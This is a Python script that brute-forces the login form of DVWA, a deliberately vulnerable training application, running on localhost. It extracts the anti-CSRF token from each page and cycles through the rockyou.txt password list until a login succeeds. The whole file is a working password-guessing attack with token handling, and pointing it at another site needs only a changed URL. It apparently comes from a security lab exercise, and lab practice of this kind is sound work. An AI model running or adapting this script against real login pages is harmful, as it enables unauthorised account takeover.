import requests
def get_url(username,password,token):
    return f"http://127.0.0.1/dvwa/vulnerabilities/brute/?username={username}&password={password}&user_token={token}&Login=submit#"
username = input("Enter Username : ")
COOKIES = {
    "PHPSESSID":"km7qua1eth40r643ggc8ll6cbp",
    "security":"high"
}
passwords = open("rockyou.txt","r")
while True:
    session = requests.Session()
    r = session.get("http://127.0.0.1/dvwa/vulnerabilities/brute/index.php",cookies=COOKIES)
    body = r.text.split(" ")
    token = body[body.index("name='user_token'")+1].split("=")[1][1:-1]

    p = passwords.readline().strip()
    url = get_url(username,p,token)
    r = session.get(url,cookies=COOKIES)
    if 'incorrect' in r.text:
        print("Trying ",p)
    else:
        print("Found ",p)
        break